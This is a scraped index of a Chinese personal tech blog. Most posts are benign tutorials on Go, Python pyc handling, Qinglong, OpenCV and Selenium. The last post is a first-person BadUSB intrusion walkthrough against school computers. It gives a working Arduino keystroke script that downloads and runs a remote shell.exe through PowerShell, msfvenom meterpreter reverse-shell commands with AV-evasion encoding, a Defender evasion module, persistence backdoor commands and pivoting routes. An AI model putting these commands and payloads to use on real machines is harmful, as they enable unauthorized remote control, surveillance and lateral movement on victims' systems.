接口变量赋值也叫实现结构体 Myworker.Work() //调用接口方法 o.Work() } 接口的嵌套 package main import ( \"fmt\" ) // Worker 接口定义了一个方法 Work type Worker interface { Work() } type Moyuer interface { Moyu() } type Peoler interface { Worker Moyuer } type Computer struct { something string } func (c *Computer) Work() { fmt.Printf(\"%s都要工作\\n\", c.something) } func (c *Computer) Moyu() { fmt.Printf(\"%s也要摸鱼\\n\", c.something) } func main() { sth := Computer{something: \"程序员\"} x := \u0026sth x.Work() x.Moyu() } 空接口 信息 空接口类型的变量可以存储任意类型的变量。 package main import ( \"fmt\" ) func main() { var x interface{} v1 := \"程序猿\" v2 := 200 v3 := true x = v1 fmt.Printf(\"%T类型 : %v\\n\", x, x) x = v2 fmt.Printf(\"%T类型 : %v\\n\", x, x) x = v3 fmt.Printf(\"%T类型 : %v\\n\", x, x) } 信息 因为可以存储任意类型的变量，所以我们把他当做方法中的参数使用。 package main import ( \"fmt\" ) func test(w interface{}) { fmt.Printf(\"Hello %s\", w) } func main() { words := \"Golang\" test(words) } //Hello Golang 类型断言 信息 类型断言的作用就是判断空接口的值和值的类型 package main import ( \"fmt\" ) func main() { var words interface{} = \"Golang\" switch value := words.(type) { //语法格式为：x.(T) case string: fmt.Printf(\"String类型，值为%v\", value) case int: fmt.Printf(\"Int类型，值为%v\", value) case bool: fmt.Printf(\"Bool类型，值为%v\", value) } } 操作redis package main import ( \"context\" \"fmt\" \"os\" \"time\" \"github.com/redis/go-redis/v9\" ) func string(ctx context.Context, client *redis.Client) { key := \"test\" value := \"test_v\" err := client.Set(ctx, key, value, time.Second*1).Err() //写_ttl为1秒 checkError(err) time.Sleep(time.Second * 2) v2, err := client.Get(ctx, key).Result() //读 checkError(err) fmt.Println(v2) client.Del(ctx, key) } func main() { cilent := redis.NewClient(\u0026redis.Options{ Addr: \"localhost:6379\", Password: \"123456\", DB: 0, }) ctx := context.TODO() string(ctx, cilent) } func checkError(err error) { { if err != nil { if err == r","date":"2024-06-18","objectID":"/posts/golang%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Golang"],"title":"go基础学习笔记","uri":"/posts/golang%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"'s friends","date":"2024-05-23","objectID":"/friends/","tags":null,"title":"互联网的朋友们","uri":"/friends/"},{"categories":null,"content":" Base info - nickname: Scan's Blog avatar: https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/logo.png url: https://www.scan.work/ description: Scan's Blog Friendly Reminder Notice 1.如果您想交换链接，请按以上格式留言。（仅限个人非商业博客/网站） 2.网站故障、停止维护和不当内容可能会被取消链接！ 3.那些不尊重他人劳动成果、无来源转载或恶意行为的网站，请不要前来交流。 ","date":"2024-05-23","objectID":"/friends/:0:0","tags":null,"title":"互联网的朋友们","uri":"/friends/"},{"categories":["Python","加密与解密"],"content":"序列化混淆压缩、反序列化操作学习记录","date":"2024-05-15","objectID":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":["加密与解密","序列化"],"title":"Python代码序列化混淆压缩学习记录","uri":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Python","加密与解密"],"content":"Python代码序列化混淆压缩学习记录 一、了解Pyc文件 1. Pyc 文件的作用： 加载的速度提高、性能提高、文件 保持加密的状态，防止源码泄露 不同版本编译后的pyc文件是不同的，不同版本不能放在一起运行 Pyc文件结构： 2. Pyc 生成的方法： 自动化生成：py文件里只要包含import，就会自动生成在__pycache__目录下，含版本号 使用生成函数 py_complie.complie(\"demo.py\") 文件夹下的Py文件编译为Pyc文件使用函数： compileall.compile_dir(r'路径) 通过 Python Shell 命令生成 python3 -m py_compile md5.py python3 -O -m py_compile md5.py 二 、混淆与反序列化Pyc文件 1. Pyc 混淆的方法： pyc = Path(\"__pycache__/demo.cpython-311.pyc\").read_bytes() # 显示 pyc 文件的头部信息 magic = pyc[:4] zero = pyc[4:8] timestamp = pyc[8:12] size = pyc[12:16] # 以 16 进制显示 print('pythons3.11 magic:', bytes(magic).hex(sep=' ').upper()) print('zero:', zero) print('timestamp:', struct.unpack('\u003cI', timestamp)[0]) print('size:', struct.unpack('\u003cI', size)[0]) # 加载 pyc 文件中的 Python 对象 pyobj = marshal.loads(pyc[16:]) # 压缩 pyc 文件中的 Python 对象 print(zlib.compress(marshal.dumps(pyobj))) # 执行 pyc 文件中的 Python 对象 exec(pyobj) 2. Pyc 反序列化还原操作： # 通过 code object 生成 pyc HEADER = magic + b\"\\x00\" * 4 # 时间随便写 HEADER += struct.pack(\"\u003cI\", int(time.time())) # 大小随便写 HEADER += struct.pack(\"\u003cI\", 30) code = HEADER + marshal.dumps('代码') Path('test.pyc').write_bytes(code) #生成pyc之后在终端cmd运行 .\\pycdc.exe .\\test.pyc 3. 使用dis模块进行指令还原代码： import dis import sys def disassemble_pyc_file(pyc_file_path): try: with open(pyc_file_path, 'rb') as file: magic = file.read(4) timestamp = file.read(4) size = file.read(4) code_object = file.read() print(\"Disassembling bytecode for:\", pyc_file_path) dis.dis(code_object) except FileNotFoundError: print(\"File not found:\", pyc_file_path) except Exception as e: print(\"An error occurred:\", e) if __name__ == \"__main__\": if len(sys.argv) != 2: print(\"Usage: python disassemble_pyc.py \u003cpyc_file\u003e\") else: pyc_file_path = sys.argv[1] disassemble_pyc_file(pyc_file_path) #使用方法: python disassemble_pyc.py \u003cpyc_file\u003e 注意 Pyc生成要与反编译（反序列化）的Python版本所对应 ","date":"2024-05-15","objectID":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:0:0","tags":["加密与解密","序列化"],"title":"Python代码序列化混淆压缩学习记录","uri":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["自动化测试"],"content":"安装、使用、拉库、配置","date":"2024-04-06","objectID":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","tags":["工具","青龙面板"],"title":"青龙面板学习笔记","uri":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["自动化测试"],"content":" 系统环境：阿里云Linux服务器、Docker 青龙面板学习笔记 使用docker安装青龙面板 docker pull whyour/qinglong:latest 运行后直接启动 docker run --name qinglong -d \\ -p 5700:5700 \\ -v /opt/ql/data:/ql/data \\ -e QlBaseUrl=\"/\" \\ #设置环境变量 QlBaseUrl 和 QlPort，青龙面板服务启动时使用 -e QlPort=\"5700\" \\ --hostname qinglong \\ #设置容器主机名为 qinglong --restart unless-stopped \\ #设置容器随docker启动自动启动 whyour/qinglong:latest 访问 ip:5700 如果已经创建容器，没有随着docker自动启动的话就运行： docker ps -a docker start [容器名称/ID] 如图： 进入容器进行操作 运行如下命令 docker exec -it [容器名] /bin/bash 出现 内置命令有(task ql)： task # 依次执行，如果设置了随机延迟，将随机延迟一定秒数 task \u003cfile_path\u003e # 依次执行，无论是否设置了随机延迟，均立即运行，前台会输出日，同时记录在日志文件中 task \u003cfile_path\u003e now # 并发执行，无论是否设置了随机延迟，均立即运行，前台不产生日，直接记录在日志文件中，且可指定账号执行 task \u003cfile_path\u003e conc \u003cenv_name\u003e \u003caccount_number\u003e(可选的) # 指定账号执行，无论是否设置了随机延迟，均立即运行 task \u003cfile_path\u003e desi \u003cenv_name\u003e \u003caccount_number\u003e # 设置任务超时时间 task -m \u003cmax_time\u003e \u003cfile_path\u003e # 使用 -- 分割，-- 后面的参数会传给脚本，下面的例子，脚本就可接收到参数 -u whyour -p password task \u003cfile_path\u003e -- -u whyour -p password ql # 更新并重启青龙 ql update # 运行自定义脚本extra.sh ql extra # 添加单个脚本文件 ql raw \u003cfile_url\u003e # 添加单个仓库的指定脚本 ql repo \u003crepo_url\u003e \u003cwhitelist\u003e \u003cblacklist\u003e \u003cdependence\u003e \u003cbranch\u003e \u003cextensions\u003e # 删除旧日志 ql rmlog \u003cdays\u003e # 启动tg-bot ql bot # 检测青龙环境并修复 ql check # 重置登录错误次数 ql resetlet # 禁用两步登录 ql resettfa more..待完善 ","date":"2024-04-06","objectID":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["工具","青龙面板"],"title":"青龙面板学习笔记","uri":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["Python","深度学习"],"content":"图片创建、修改、翻转与画线、形状。","date":"2023-07-23","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/","tags":["OpenCV","Python","深度学习"],"title":"OpenCV——基础笔记(二)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Python","深度学习"],"content":"图片修改与翻转 修改大小 img_size = cv2.resize(img,(1000,300)) #修改大小 plt.imshow(img) img_size.shape #是以 宽，长 显示而不是长，宽 翻转 # 0 垂直翻转 1 水平翻转 -1 水平锤直都翻转 img_flip= cv2.flip(img_fix,值) 创建黑色画布 img = np.zeros((300, 300, 3), dtype = \"uint8\") pts = np.array([[10, 50], [200, 50], [90, 200]], np.int32) pts = pts.reshape((-1, 1, 2)) 基础画线画图 画线 cv2.line(img, (起始点), (结束点), (颜色), thickness=10) cv2.imshow('窗口名称', img) cv2.waitKey(0) #无限等待，按任意键退出 cv2.destroyAllWindows() #关闭窗口 画圆 cv2.circle(img=img,center=(圆心的坐标),radius=半径,color=(0,0,255),thickness=10) #圆心坐标先是 Y轴 再是X轴 cv2.imshow('窗口名称', img) cv2.waitKey(0) #无限等待，按任意键退出 cv2.destroyAllWindows() #关闭窗口 画矩形 / 多边形 矩形 cv2.rectangle(img, (左上角坐标), (右下角坐标), (0, 255, 0), 10) cv2.imshow('窗口名称', img) cv2.waitKey(0) #无限等待，按任意键退出 cv2.destroyAllWindows() #关闭窗口 多边形（以三角形为例） pts = np.array([[300, 10], [200, 50], [150, 140]], np.int32) #三角形的三个点 pts = pts.reshape((-1, 1, 2)) cv2.polylines(img, [pts], True, (0, 255, 0), 3) #True线条是否闭合 pts为列表 cv2.imshow('窗口名称', img) cv2.waitKey(0) #无限等待，按任意键退出 cv2.destroyAllWindows() #关闭窗口 注意 创建一个新的图像或者调整图像的大小时为（Y，X）形式表示 其余都为（X，Y）形式表示 ","date":"2023-07-23","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/:0:0","tags":["OpenCV","Python","深度学习"],"title":"OpenCV——基础笔记(二)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Python","深度学习"],"content":"理解图像的本质,图片、颜色通道、转化方式、备份原图。","date":"2023-07-22","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/","tags":["OpenCV","Python","深度学习"],"title":"OpenCV——基础笔记(一)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Python","深度学习"],"content":"导入需要的包 import numpy as np import matplotlib.pyplot as plt %matplotlib inline ##嵌入画图在jupyter中使用，开发工具中去除 from PIL import Image 测试打开图片 img = Image.open('123.jpeg') img 转换为Numpy元组 img_1 = np.asanyarray(img) img_1.shape #(960, 720, 3) 长，宽，3个颜色通道分别为Red、Green、Blue 复制一份图片 img_1_copy = img_1.copy() #保持原图可二次修改 颜色通道修改 plt.imshow(img_1_copy[:,:,0]) #单独显示了红色通道。 img[:,:] = [255, 255, 0] # RGB值(255, 255, 0)代表黄色——颜色的混合 Matplotlib的颜色映射 Matplotlib 提供了许多预定义的颜色映射。以下是一些常见的颜色映射：\r- 'viridis'：默认的颜色映射，从深蓝色到黄色的渐变。\r- 'plasma'：从深紫色到橙色的渐变。\r- 'inferno'：从黑色到深红色的渐变。\r- 'magma'：从黑色到白色，中间包含紫色和橙色的渐变。\r- 'cividis'：从深蓝色到黄色的渐变，设计用于色盲友好。\r- 'Greys'：从黑色到白色的灰度渐变。\r- 'Purples'：从浅紫色到深紫色的渐变。\r- 'Blues'：从浅蓝色到深蓝色的渐变。\r- 'Greens'：从浅绿色到深绿色的渐变。\r- 'Oranges'：从浅橙色到深橙色的渐变。\r- 'Reds'：从浅红色到深红色的渐变。几个栗子，参考参考 原图：一只小盲仔 Matplotlib的imshow()函数期望图像是RGB格式的。所以，如果你在OpenCV中处理图像（它使用BGR），然后想用Matplotlib显示图像，你需要将其从BGR转换为RGB。 import cv2 from matplotlib import pyplot as plt img_bgr = cv2.imread('image.jpg') img_rgb = cv2.cvtColor(img_bgr, cv2.COLOR_BGR2RGB) plt.imshow(img_rgb) plt.show() #显示所有已经创建的图像 注意 图上所示：img_1_copy[:，:，0]) 0、1、2 分别代表图像的所有行数，所有列，索引值 索引值说明： 0、1、2分别对应红、绿、蓝（RGB） 如果使用OpenCV打开就是蓝、绿、红(BGR)。 ","date":"2023-07-22","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/:0:0","tags":["OpenCV","Python","深度学习"],"title":"OpenCV——基础笔记(一)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Python"],"content":"书法文字检测形态学 # 检测书法文字 步骤： 1、读取图片，灰度、二值化处理 # 二值化 # 参数1：输入图片 # 参数2：比较的阈值 # 参数3：超出阈值被设定的值 # 参数4：模式 # 作用：将画面像素与比较阈值对比，小于它则设为0（黑色），大于它设为目标值 r,black_img = cv2.threshold(gray,100,255,cv2.THRESH_BINARY_INV) plt.imshow(black_img,cmap='gray') 边缘检测 #边缘检测 edges = cv2.Canny(图像值,30,200) plt.imshow(edges,cmap='gray') 3、膨胀连接 4、闭合孔洞 5、边缘检测 6、画检测框 ","date":"2023-06-06","objectID":"/posts/%E5%BD%A2%E6%80%81%E5%AD%A6%E6%96%B9%E6%B3%95%E6%A3%80%E6%B5%8B/:0:0","tags":["深度学习","Python"],"title":"形态学检测方法","uri":"/posts/%E5%BD%A2%E6%80%81%E5%AD%A6%E6%96%B9%E6%B3%95%E6%A3%80%E6%B5%8B/"},{"categories":["自动化测试","Python"],"content":"进阶使用执行：JS代码，模拟按键组合键、切换窗口总结。","date":"2023-06-04","objectID":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/","tags":["工具","Python","Selenium"],"title":"Selenium——进阶使用","uri":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/"},{"categories":["自动化测试","Python"],"content":"浏览器的控制 driver.set_window_size(宽，高)#设置宽高 driver.maximize_window()#全屏显示 driver.forward() #浏览器的上一步 driver.back() #浏览器的后退 driver.refresh() #浏览器的刷新 浏览器的窗口切换 获取窗口句柄 handles=driver.window_handles print(handles) 切换窗口命令 driver.switch_to.window(handles[0]) handles[0] 切换到最开始打开的窗口 handles[-1] 切换到最新打开的窗口 handles[-2] 倒数第二个打开的窗口 进阶姿势 JS代码执行 executeScript是同步方法，用它执行js代码会阻塞主线程执行，直到js代码执行完毕； executeAsyncScript方法是异步方法，它不会阻塞主线程执行。 #值可写多个JS变量 execute_script() executeAsyncScript() 上传文件的元素操作 WebElement adFileUpload =driver.findElement(By.id(\"上传\")); String filePath = \"C:\\1.php\";adFileUpload.sendKeys(filePath) 隐式等待 如果在30秒内执行就继续下一步，没有执行就等待30秒，30秒如果元素还未出现则跳过，不抛出异常 driver.implicitly_wait(30) 显式等待 如果执行就继续下一步，没有执行就等待30秒，30秒如果元素还未出现则抛出异常，不继续 demo: python\rresult=WebDriverWait(driver,10).until(expected_conditions.alert_is_present()) alert_is_present() #判断页面是否出现alert框 title_is() #判断页面title内容是与传入的title_text内容完全匹配 title_contains() #判断页面title标签的内容包含 partial_title() #只需要部分匹配即可 text_to_be_present_in_element_value() #判断text是否出现在元素的value属性值中 text_to_be_present_in_element() #判断文本内容test是否出现在某个元素中，判断的是元素的text presence_of_all_elements_located(*locator*)#判断页面至少有一个如果元素出现，如果满足条件，返回所有满足定位表达式的页面元素 技巧 不等待某个元素加载，使用time.sleep方法，方便快捷。 键盘操作 第一种方法——Selenium自带的Keys包 from selenium.webdriver.common.keys import Keys 常见的键盘操作： # 删除键 sent_keys(Keys.BACK_SPACE) # 空格键 sent_keys(Keys.SPACE) # tab 键 sent_keys(Keys.TAB) # delete 键 sent_keys(Keys.DELETE) # + 键 sent_keys(Keys.ADD) # enter 键 sent_keys(Keys.ENTER) # shift 键 sent_keys(Keys.SHIFT) # ctrl+A：全选 sent_keys(Keys.CONTROL, 'a') # ctrl+C：复制 sent_keys(Keys.CONTROL, 'c') # ctrl+V：粘贴 sent_keys(Keys.CONTROL, 'v') # ctrl+X：剪切 sent_keys(Keys.CONTROL, 'x') # F1 键 sent_keys(Keys.F1) # 数字9 键 sent_keys(Keys.NUMPAD9) 第二种方法——Python的第三方库——pywin32库 import win32api import win32con class KeyboardKeys(object): #模拟键盘按键类 VK_CODE={ 'enter':0x0D, 'ctrl':0x11, 'v':0x56 } @staticmethod def keyDown(keyName): #按下按键 win32api.keybd_event(KeyboardKeys.VK_CODE[keyName],0,0,0) @staticmethod def keyUp(keyName): #释放按键 win32api.keybd_event(KeyboardKeys.VK_CODE[keyName],0,win32con.KEYEVENTF_KEYUP,0) @staticmethod def oneKey(key): #模拟单个按键 KeyboardKeys.keyDown(key) KeyboardKeys.keyUp(key) @staticmethod def twoKeys(key1,key2): #模拟两个组合键 KeyboardKeys.keyDown(key1) KeyboardKeys.keyDown(key2) KeyboardKeys.keyUp(key2) KeyboardKeys.keyUp(key1) 问题 Keybd_event() 共有四个参数： 第一个为按键的虚拟键值，如回车键为vk_return，tab键为vk_tab； 第二个参数为扫描码，一般不用设置，用0代替就行； 第三个参数为选项标志，如果为keydown则置0即可，如果为keyup则设成\"KEYEVENTF_KEYUP\"； 第四个参数一般也是置0即可。 鼠标操作 from selenium.webdriver.common.action_chains import ActionChains 全局鼠标操作语法如下： 1.初始化ActionChians类（动作链条）： actions = ActionChains(driver) 2.找到要操作的元素： element = find_element (值)3.调用鼠标操作方法： actions.move_to_element(element) 4.执行鼠标操作方法： actions.perform()调用 perform() 方法时，队列中的操作会依次进行。 常用方法 double_click(on_element=None) #双击鼠标左键 #常用于拖拽验证码环节，不包括图像补全验证码。 source = driver.find_element_by_id(xxx) target = driver.find_element_by_id(xxx) drag_and_drop(source, target) action.drag_and_drop(source, target).perform() #拖拽元素 move_by_offset(xoffset, yoffset) #鼠标从1位置移动到2坐标 release(on_element=None) #在元素上释放按住的鼠标按钮（在某个元素位置松开鼠标左键） 注意 最终调用 perform() 方法时，队列中的操作才会依次进行。 ","date":"2023-06-04","objectID":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/:0:0","tags":["工具","Python","Selenium"],"title":"Selenium——进阶使用","uri":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/"},{"categories":["自动化测试","Python"],"content":"安装便捷、对应版本、安装建议、不同系统下的安装方法","date":"2023-06-03","objectID":"/posts/chromedriver%E5%AE%89%E8%A3%85/","tags":["工具","Python","Selenium"],"title":"Selenium——ChromeDriver安装","uri":"/posts/chromedriver%E5%AE%89%E8%A3%85/"},{"categories":["自动化测试","Python"],"content":" 摘要 “Selenium支持市场上所有主要浏览器,如Chrome、Firefox、IE（7, 8, 9, 10, 11）、Edge、Opera和Safari，下面以主流的Chrome浏览器进行安装测试。 安装Selenium pip install selenium 安装ChromeDriver 谷歌镜像 http://chromedriver.storage.googleapis.com/index.html 淘宝镜像 https://npm.taobao.org/mirrors/chromedriver/ 根据自己Chrome浏览器版本下载 建议使用高版本，低版本有些功能使用有BUG 添加环境变量 将安装好的ChromeDriver目录添加到环境变量 如果没有配置,则在你的Python代码中写出： from selenium import webdriver options = webdriver.ChromeOptions() driver = webdriver.Chrome(executable_path=\"你的ChromeDriver的绝对路径\", options=options) driver.get(\"https://www.baidu.com/\") driver.close() 简便设置 在Chrome快捷方式标签下，目标后面加上参数，在目标后加入cmd当中的参数，起始位置为自己的项目路径，这样方便管理各个测试项目、端口，目录英文名即为项目名。 –remote-debugging-port=9222 --user-data-dir=\"./自定义空目录（英文）\" 使用cmd，运行下面的命令，即可查看运行状态。 netstat -ano | findstr 9222 技巧 运行代码后，再手动打开浏览器，实现调试目的，不乱顺序。 一些错误解决 如遇到版本不匹配等问题，运行下面代码： from win32com.client import Dispatch import re import stat,zipfile,os,psutil import requests from lxml import etree import time class auto_download_chromedrive(object): def __init__(self): self.chromedrive_url = \"https://chromedriver.chromium.org/downloads\" self.local_chrome_paths = [r\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\", r\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"] self.headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'} def get_version_via_com(self, filename): parser = Dispatch(\"Scripting.FileSystemObject\") try: version = parser.GetFileVersion(filename) except Exception: return None return version def get_chromedriver_urls(self): try: r = requests.Session() response = r.get(self.chromedrive_url, headers=self.headers) print(response.status_code, response.encoding) html = etree.HTML(response.text, etree.HTMLParser()) # 解析HTML文本内容 version_href = html.xpath(\".//strong//..//@href\") print(\"all chrome browser versions can be choosed:\") for href in version_href: print(href) return version_href except Exception: return None def download_chromadrive(self, url): try: r = requests.Session() response = r.get(url, headers=self.headers) if response.status_code == 200: with open(\"chromedriver_win32.zip\", \"wb\") as f: f.write(response.content) print(\"下载完成\") return 1 else: print('Url请求返回错误，错误码为： %d' % response.status_code) return None except Exception: print(\"request download chromedriver_win32.zip failed!\") return None def find_local_version(self, loc_ver, all_ver): \"\"\" :param loc_ver: 本地浏览器的版本 :param all_ver: 下载的所有版本浏览器版本 :return: 找到匹配的，return url,否则return None \"\"\" for href in all_ver: try: res = re.search(r\"path=(.*?)/\", href) find_ver = res.group(1).split(\".\")[0] #截取大版本 if loc_ver == find_ver: return href except Exception: continue print(\"not find match chrome browser{} version!\".format(loc_ver)) return None def kill_process(self, process_name): print(\"检测{}进程是否存在，存在则杀掉。\".format(process_name)) pl = psutil.pids() for pid in pl: if psutil.Process(pid).name() == process_name: print('{} 存在进程中,杀掉'.format(process_name)) os.popen('taskkill /f /im %s' %process_name) return pid print('{} 不存在进程中。'.format(process_name)) return None def unzip(self): self.kill_process(\"chromedriver.exe\") print(\"去除旧版本chromedriver_win32文件夹内文件的只读属性(如果是只读)\") old_driver_path = os.path.join(os.getcwd(), \"chromedriver_win32\") if os.path.exists(old_driver_path): for sub_file in os.listdir(old_driver_path): os.chmod(os.path.join(old_driver_path, sub_file), stat.S_IRWXU) time.sleep(1) #这个delay必须要有，os操作还是需要时间的 print('''解压 chromedriver_win32.zip,覆盖旧版本''') zFile = zipfile.ZipFile(os.path.join(os.getcwd(), \"chromedriver_win32.zip\"), \"r\") for fileM in zFile.namelist(): zFile.extract(fileM, old_driver_path) zFile.close() def start(self): '''读取本地chrome version''' version = list(filter(None, [self.get_version_via_com(p) for p in self.local_chrome_paths]))[0] if not version: print(\"check chrome browser version failed!\") return None print(\"chrome browser version:\", version) '''下载网页端与本地匹配的chromedriver.exe''' version_href = self.get_chromedriver_urls() if not version_hre","date":"2023-06-03","objectID":"/posts/chromedriver%E5%AE%89%E8%A3%85/:0:0","tags":["工具","Python","Selenium"],"title":"Selenium——ChromeDriver安装","uri":"/posts/chromedriver%E5%AE%89%E8%A3%85/"},{"categories":["近源渗透"],"content":"本文所用到的工具： l Badusb l Ngrok l Arduino l Msfconsole l Msfvenom l 迷你相机 蓄谋已久的前言： 每次上楼时，都能看见广播室门开得非常宽， 但这不是重点，重点是里面的电脑（Windows XP），电脑桌面上是LED大屏幕的编辑软件。 二楼有个网络管理箱并由管道内的网线传输到每个教室的多媒体（Windows 10）。 看看兜里的Badusb，突然就散发出了浓浓的香味，哧溜。 俗话说“艺高人胆大”，但吾也要：武艺不高强，菜鸟也先飞！ 分析并整理收集到的信息 主机 系统 杀毒软件 网络状态 广播室 Windows XP 不详 不详 多媒体 Windows 10 Defender**、360 正常 而且我们从二楼的网络管理箱分支网线的管道可推断出二楼所有教师的多媒体属于同一内网。我们在烧录代码的时候，就要根据不同的系统版本，网络状态，杀毒软件等因素来进行烧录。为什么说广播室的具体信息我们获取不到呢？因为“可远观，而不可亵玩焉。” 部署Payload及规避模块到Ngrok 首先我们使用规避模块生成一个Windows EXE文件来规避Windwos Defender程序，操作如下： show evasuibd use windows/windows_defender_exe show options 接着run 可以看到生成的FILE NAME（文件名是随机的） 当然也可以自定义 Set FILENAME 文件名即可 生成的文件保存到了 /root/.msf4/local/yZdsypg.exe接下来我们来部署反弹环境 在这里来注册一个账户 登录后来到后台页面点击 当然也有免费的隧道，不过网速较慢，根据自己的情况而定！ 接着我们点击立即购买，会跳转到隧道配置的页面，如图： 使用ping服务器地址命令，找到IP地址。 接着我们打开刚解压下来的文件夹 输入./sunny clientid 填写你的隧道ID 出现这个界面就代表隧道连接成功！ 接着我们用Msfvenom生成可执行文件,代码如下： msfvenom -p windows/meterpreter/reverse_tcp LHOST=平台给出的IP LPORT=平台给出的端口 -e x86/shikata_ga_nai -b \"\\x00\" -i 5 -a x86 --platform win PrendMigrate=true PrendMigrateProc=svchost.exe -f exe -o /root/shell.exe 注：如果是64位系统，Payload则更改为：windows/x64/meterpreter/reverse_tcp对于小白很陌生带两个值是可以实现自动迁移进程的功能，关闭其中一进程并不影响另一进程。 -k选项并不适用于所有模板，请提前做好测试。 安装Arduino 首先我们打开arduino安装包 完成了安装。 配置如下： 完成安装。 烧录代码 代码贴出： #include \u003cKeyboard.h\u003e void setup() {//初始化 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500); Keyboard.press('r');//r键 delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release('r'); delay(500); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.println(\"CMD.EXE /t:01 /k MODE con: cols=16 lines=2\"); delay(1000); Keyboard.println(\"POWERSHELL -cOMMAND $CLNT = NEW-OBJECT sYSTEM.nET.wEBcLIENT;$URL= 'http://ip/shell.exe';$FILE = ' c:\\\\SHELL.EXE ';$CLNT.dOWNLOADfILE($URL,$FILE);\"); delay(3000); Keyboard.println(\"C:\\\\SHELL.EXE\u0026EXIT\"); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end();//结束键盘通讯 } void loop()//循环 { } 更多代码在文章底部有相关信息，不要着急！ 编译好之后我们直接上传即可完成烧录，直接点击上传可以检查编译并上传。 Shell快到碗里来 让基友给我赶烧： 如图： 我们已经获取到了Meterpreter会话，现在我们可以为所欲为了！ 为了防止亡羊补牢，要一劳永逸，我们先添加一个持久后门，命令如下： run persistence -X -i 5 -p 端口 -r IP 或者 run metsvc 第二种方法直接监听即可，具体方法找谷哥和度娘。 附带一张屏幕截图： screenshot 打开偷窥一下： 内网漫游 查看子网： 查看子网： run get_local_subnets 添加路由： route add 子网 掩码 会话id 查看路由： route print 自动化添加路由： load auto_add_route 额…….好吧 得退出meterpreter会话，因不可描述因素，就这样吧。 提示得运行一个Post模块，并且添加参数，大家明白就好。 设置完毕后接下来就看自己的操作了， 广播室也被搞定，也是因不可描述规章制度等原因不再继续。 正文到此结束。 总结 1.要提前知晓操作系统。 2.根据不同的系统要构造不同的Payload。 3.采用多种可执行后缀（bat、exe、docx）。 4.获取Shell要第一时间添加后门。 5.不推荐使用Ngrok，自行百度其他平台，但使用方法基本一致。 6.添加完路由如果有网络异常状态，则删除路由条目。 代码以烧录器整理集合如下： (均来自互联网、适用与否请提前在虚拟机测试) 打开烧录脚本软件，点击文件–打开即可。 提取码：btmz https://pan.baidu.com/s/17UCyKosBkjCRb7IBfxfdPg 注：本文仅供参考，内容仅为虚构，代码以及使用方法切勿使用于非法用途！ 原创文章-原文链接 